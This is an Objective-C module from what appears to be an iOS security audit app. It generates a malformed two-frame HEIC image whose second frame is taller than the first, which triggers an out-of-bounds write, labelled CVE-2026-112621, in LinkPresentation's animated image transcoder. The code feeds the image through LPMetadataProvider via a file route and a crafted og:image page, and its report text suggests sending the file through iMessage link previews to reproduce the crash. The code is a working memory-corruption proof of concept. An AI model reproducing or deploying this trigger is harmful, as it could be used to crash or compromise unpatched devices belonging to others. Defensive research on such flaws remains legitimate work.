#import "KPAuditLP112621Module.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <objc/message.h>
#import <LinkPresentation/LinkPresentation.h>
#import <ImageIO/ImageIO.h>
#import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>

@interface KPAuditLP112621Module ()
@property (nonatomic, assign) BOOL armed;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditLP112621Module

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"lp112621.armed" : @"lp112621.baseline";
        _title = armed ? @"LinkPresentation HEIC OOB (armed)" : @"LinkPresentation HEIC (baseline)";
        _subtitle = armed
            ? @"CVE-2026-112621 trigger: 256x16 -> 256x48 frames, LPMetadataProvider"
            : @"Safe control: equal-height multi-frame HEIC through LP transcoder";
        _icon = armed ? @"exclamationmark.triangle" : @"photo.on.rectangle";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

#pragma mark - HEIC generation (Xplo8E layout, own implementation)

- (CGImageRef)makeFrameWithHeight:(size_t)height bgra:(uint32_t)bgra CF_RETURNS_RETAINED {
    const size_t width = 256;
    const size_t rowBytes = width * 4;
    uint8_t *pixels = (uint8_t *)malloc(rowBytes * height);
    if (!pixels) return NULL;
    for (size_t i = 0; i < width * height; i++) {
        memcpy(pixels + i * 4, &bgra, 4);
    }
    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
    CGContextRef context = CGBitmapContextCreate(pixels, width, height, 8, rowBytes, colorSpace,
                                                 kCGImageAlphaNoneSkipFirst | kCGBitmapByteOrder32Little);
    CGImageRef image = context ? CGBitmapContextCreateImage(context) : NULL;
    if (context) CGContextRelease(context);
    CGColorSpaceRelease(colorSpace);
    free(pixels);
    return image;
}

- (nullable NSString *)writeHEICWithHeightA:(size_t)h0 heightB:(size_t)h1 name:(NSString *)name {
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:name];
    [[NSFileManager defaultManager] removeItemAtPath:path error:NULL];
    NSURL *url = [NSURL fileURLWithPath:path];
    CGImageDestinationRef destination =
        CGImageDestinationCreateWithURL((__bridge CFURLRef)url, CFSTR("public.heic"), 2, NULL);
    if (!destination) return nil;

    NSDictionary *options = @{(__bridge NSString *)kCGImageDestinationLossyCompressionQuality: @1.0};
    CGImageRef frame0 = [self makeFrameWithHeight:h0 bgra:0xFF202020u];
    CGImageRef frame1 = [self makeFrameWithHeight:h1 bgra:0xFFADBEEFu];
    if (!frame0 || !frame1) {
        if (frame0) CGImageRelease(frame0);
        if (frame1) CGImageRelease(frame1);
        CFRelease(destination);
        return nil;
    }
    CGImageDestinationAddImage(destination, frame0, (__bridge CFDictionaryRef)options);
    CGImageDestinationAddImage(destination, frame1, (__bridge CFDictionaryRef)options);
    CGImageRelease(frame0);
    CGImageRelease(frame1);
    BOOL ok = CGImageDestinationFinalize(destination);
    CFRelease(destination);
    return ok ? path : nil;
}

- (NSDictionary *)frameOracleForPath:(NSString *)path {
    NSMutableDictionary *info = [NSMutableDictionary dictionary];
    CGImageSourceRef source = CGImageSourceCreateWithURL((__bridge CFURLRef)[NSURL fileURLWithPath:path], NULL);
    if (!source) {
        info[@"error"] = @"CGImageSourceCreateWithURL failed";
        return info;
    }
    info[@"frame_count"] = @(CGImageSourceGetCount(source));
    NSMutableArray *frames = [NSMutableArray array];
    for (size_t i = 0; i < CGImageSourceGetCount(source); i++) {
        CFDictionaryRef props = CGImageSourceCopyPropertiesAtIndex(source, i, NULL);
        CGImageRef frame = CGImageSourceCreateImageAtIndex(source, i, NULL);
        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
        if (props) {
            NSDictionary *p = (__bridge NSDictionary *)props;
            entry[@"prop_width"] = p[(id)kCGImagePropertyPixelWidth];
            entry[@"prop_height"] = p[(id)kCGImagePropertyPixelHeight];
            CFRelease(props);
        }
        if (frame) {
            entry[@"decoded_width"] = @(CGImageGetWidth(frame));
            entry[@"decoded_height"] = @(CGImageGetHeight(frame));
            CGImageRelease(frame);
        }
        [frames addObject:entry];
    }
    info[@"frames"] = frames;
    CFRelease(source);
    return info;
}

#pragma mark - Trigger via public LPMetadataProvider

- (NSDictionary *)runMetadataProviderForImage:(NSString *)path {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    NSURL *fileURL = [NSURL fileURLWithPath:path];

    if (@available(iOS 16.0, *)) {
        // Direct image route: LPMetadataProvider feeds LPImage; multi-frame HEIC
        // is accepted by -[LPImage _isAnimated] for image/heic, which spawns
        // LPAnimatedImageTranscoder — the vulnerable consumer.
        // Selector is not in every SDK header; dispatch dynamically.
        LPMetadataProvider *provider = [[LPMetadataProvider alloc] init];
        provider.timeout = 30;
        SEL imageSel = NSSelectorFromString(@"startFetchingMetadataForImageAtFileURL:completionHandler:");
        if ([provider respondsToSelector:imageSel]) {
            dispatch_semaphore_t sema = dispatch_semaphore_create(0);
            __block NSDictionary *fetchInfo = nil;
            void (^handler)(LPLinkMetadata *, NSError *) = ^(LPLinkMetadata *metadata, NSError *error) {
                NSMutableDictionary *info = [NSMutableDictionary dictionary];
                info[@"route"] = @"startFetchingMetadataForImageAtFileURL";
                if (error) {
                    info[@"error"] = error.localizedDescription ?: error.domain;
                    info[@"error_code"] = @(error.code);
                } else {
                    info[@"status"] = @"COMPLETED";
                    info[@"title"] = metadata.title ?: @"(nil)";
                }
                fetchInfo = info;
                dispatch_semaphore_signal(sema);
            };
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
            ((void (*)(id, SEL, id, id))objc_msgSend)(provider, imageSel, fileURL, handler);
#pragma clang diagnostic pop
            long waited = dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(40 * NSEC_PER_SEC)));
            if (waited != 0) {
                result[@"timeout"] = @YES;
            } else {
                result[@"image_route"] = fetchInfo ?: @{};
            }
        } else {
            result[@"image_route"] = @"SELECTOR_NOT_AVAILABLE";
        }
    } else {
        result[@"image_route"] = @"NOT_AVAILABLE_BEFORE_IOS16";
    }

    return result;
}

- (NSDictionary *)runMetadataProviderForPagePointingAt:(NSString *)heicPath {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    NSString *htmlPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-lp-preview.html"];
    NSString *html = [NSString stringWithFormat:
        @"<!doctype html><html><head>"
        @"<meta property=\"og:title\" content=\"kp\">"
        @"<meta property=\"og:image\" content=\"file://%@\">"
        @"<meta property=\"og:image:type\" content=\"image/heic\">"
        @"</head><body>kp</body></html>", heicPath];
    NSError *writeError = nil;
    if (![html writeToFile:htmlPath atomically:YES encoding:NSUTF8StringEncoding error:&writeError]) {
        result[@"error"] = writeError.localizedDescription ?: @"html write failed";
        return result;
    }

    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    __block NSDictionary *fetchInfo = nil;
    LPMetadataProvider *provider = [[LPMetadataProvider alloc] init];
    provider.timeout = 30;
    [provider startFetchingMetadataForURL:[NSURL fileURLWithPath:htmlPath]
                        completionHandler:^(LPLinkMetadata *metadata, NSError *error) {
        NSMutableDictionary *info = [NSMutableDictionary dictionary];
        info[@"route"] = @"startFetchingMetadataForURL(page->og:image)";
        if (error) {
            info[@"error"] = error.localizedDescription ?: error.domain;
        } else {
            info[@"status"] = @"COMPLETED";
            info[@"image_provider_class"] = NSStringFromClass([metadata.imageProvider class]) ?: @"(nil)";
        }
        fetchInfo = info;
        dispatch_semaphore_signal(sema);
    }];
    long waited = dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(40 * NSEC_PER_SEC)));
    result[@"page_route"] = (waited != 0) ? @{@"timeout": @YES} : (fetchInfo ?: @{});
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 audit · CVE-2026-112621 · LinkPresentation ===\n"];
    [report appendString:@"Surface: LPAnimatedImageTranscoder encodeNextFrame (NOT ImageIO write path).\n"];
    [report appendString:@"Model: pool sized from frame 0; later frame same width, taller height\n"];
    [report appendString:@"       => CGBitmapContextCreate(pool, W, H_tall) + CGContextClearRect OOB.\n"];
    [report appendString:@"Source: Apple 149230 (fixed 27.2), Xplo8E gen_heic.m + Appknox write-up.\n"];
    [report appendFormat:@"Target: %@ / iOS %@ / uid=%d euid=%d\n",
     UIDevice.currentDevice.systemName, UIDevice.currentDevice.systemVersion, getuid(), geteuid()];
    [report appendString:self.armed
        ? @"Mode: ARMED — 256x16 -> 256x48 (mismatch is the trigger).\n"
        : @"Mode: BASELINE — 256x16 -> 256x16 (equal heights, control).\n"];

    size_t h0 = 16;
    size_t h1 = self.armed ? 48 : 16;
    NSString *name = self.armed ? @"kp-lp-armed.heic" : @"kp-lp-baseline.heic";
    NSString *path = [self writeHEICWithHeightA:h0 heightB:h1 name:name];
    if (!path) {
        [report appendString:@"VERDICT: NOT_RUN\n"];
        [report appendString:@"reason: CGImageDestination could not write the HEIC.\n"];
        return report;
    }

    NSError *attrError = nil;
    NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:&attrError];
    [report appendFormat:@"heic: path=%@ bytes=%@\n", path.lastPathComponent, attrs[NSFileSize] ?: @"?"];
    [report appendFormat:@"oracle: %@\n", [self frameOracleForPath:path]];

    [report appendString:@"--- pre-trigger journal (crash forensics) ---\n"];
    [KPLog.shared append:[NSString stringWithFormat:@"[lp112621] BEFORE_TRIGGER armed=%d path=%@", self.armed, path.lastPathComponent]];
    [report appendString:@"BEFORE_TRIGGER logged.\n"];

    NSDictionary *imageRoute = [self runMetadataProviderForImage:path];
    [report appendFormat:@"image_route: %@\n", imageRoute];
    [report appendString:@"AFTER_IMAGE_ROUTE survived.\n"];

    NSDictionary *pageRoute = [self runMetadataProviderForPagePointingAt:path];
    [report appendFormat:@"page_route: %@\n", pageRoute];
    [report appendString:@"AFTER_PAGE_ROUTE survived.\n"];

    [report appendString:@"\nVERDICT: "];
    if (self.armed) {
        [report appendString:@"SURVIVED\n"];
        [report appendString:
         @"Interpretation: LPMetadataProvider completed without faulting this process.\n"
         @"This does NOT close CVE-2026-112621: the original crash was on the\n"
         @"com.apple.LinkPresentation.AnimatedImageTranscoder queue and was reliably\n"
         @"reproduced through Messages link previews; image-route metadata can return\n"
         @"without invoking encodeNextFrame on every OS build.\n"
         @"Next: send the HEIC via an iMessage link preview (og:image over HTTPS) and\n"
         @"watch for EXC_BAD_ACCESS in __bzero/CGContextClearRect on the transcoder queue.\n"];
    } else {
        [report appendString:@"SURVIVED (expected — equal-height control)\n"];
        [report appendString:@"Control frame counts and decoded sizes must match the oracle above.\n"];
    }
    return report;
}

@end
